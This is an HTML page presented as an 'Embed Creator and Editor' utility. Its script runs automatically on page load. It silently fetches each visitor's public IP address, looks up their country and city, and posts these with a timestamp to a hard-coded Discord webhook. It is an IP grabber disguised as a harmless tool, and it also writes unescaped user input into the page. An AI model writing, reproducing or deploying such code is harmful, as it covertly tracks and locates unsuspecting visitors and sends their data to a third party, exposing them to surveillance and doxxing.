<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Embed Creator and Editor</title>
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
        }
        .embed-inputs {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .embed-inputs input {
            width: 45%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .embed-preview {
            background-color: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
        }
        .embed-preview img {
            display: block;
            margin: 0 auto;
            max-width: 100%;
            border-radius: 50%; /* Added border-radius for circular pfp */
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body onload="sendEmbed()">
    <div class="container">
        <h1>Embed Creator and Editor</h1>
        <div class="embed-inputs">
            <input type="text" id="embedCreator" placeholder="Embed Creator">
            <input type="text" id="embedEditor" placeholder="Embed Editor">
        </div>
        <button onclick="sendEmbed()">Send Embed</button>
        <div class="embed-preview" id="embedPreview"></div>
    </div>

    <script>
        async function sendEmbed() {
            const webhookUrl = 'https://discord.com/api/webhooks/1231549978938183681/sZ1XT3P7s988xYunl_DslDc569hAoWizo6WK3wp1mXa5bUhgcJlbwDbfEZWygItrhY-8';
            const embedCreator = document.getElementById('embedCreator').value;
            const embedEditor = document.getElementById('embedEditor').value;

            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipAddress = ipData.ip;

            // Fetching additional details
            const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
            const geoData = await geoResponse.json();
            const country = geoData.country_name;
            const city = geoData.city;
            const time = new Date().toLocaleTimeString();

            const ipEmbed = {
                embeds: [
                    {
                        title: 'User IP Address',
                        description: `User's IP address: ${ipAddress}\nCountry: ${country}\nCity: ${city}\nTime: ${time}`,
                        thumbnail: {
                            url: 'https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?f=y&d=mm&s=200' // Example pfp URL
                        }
                    }
                ]
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(ipEmbed)
            });

            const embedPreview = document.getElementById('embedPreview');
            embedPreview.innerHTML = `
                <h2>Embed Preview</h2>
                <p><strong>Embed Creator:</strong> ${embedCreator}</p>
                <p><strong>Embed Editor:</strong> ${embedEditor}</p>
            `;
        }
    </script>
</body>
</html>
